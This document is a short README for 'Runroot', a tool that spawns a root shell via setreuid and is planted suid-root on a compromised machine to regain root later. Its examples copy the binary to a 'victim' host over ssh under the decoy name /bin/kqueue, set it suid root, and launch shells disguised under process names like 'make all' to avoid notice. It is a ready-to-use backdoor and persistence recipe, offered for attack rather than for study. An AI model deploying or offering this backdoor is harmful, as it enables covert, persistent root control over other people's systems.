Runroot
=======
Escalates a normal user to root.

Runroot does the old setreuid trick and spawns a root shell.  It is intended to
be stashed away somewhere suid root, and used to get root back if only
user-level access is possible.

If given an argument, the first argument will be the name the shell spawns as,
otherwise, `login --` is used.

Example
-------
Installation:
```sh
# On attack box
ssh root@victim 'cat >/bin/kqueue' < ./runroot

# On victim box, as root
chown root:root /bin/kqueue
chmod 4755 /bin/kqueue
```

Usage:
```sh
# On victim box, as non-root
/bin/kqueue            # Spawns root shell named 'login --'
- or -
/bin/kqueue 'make all' # Spawns root shell named 'make all'
```
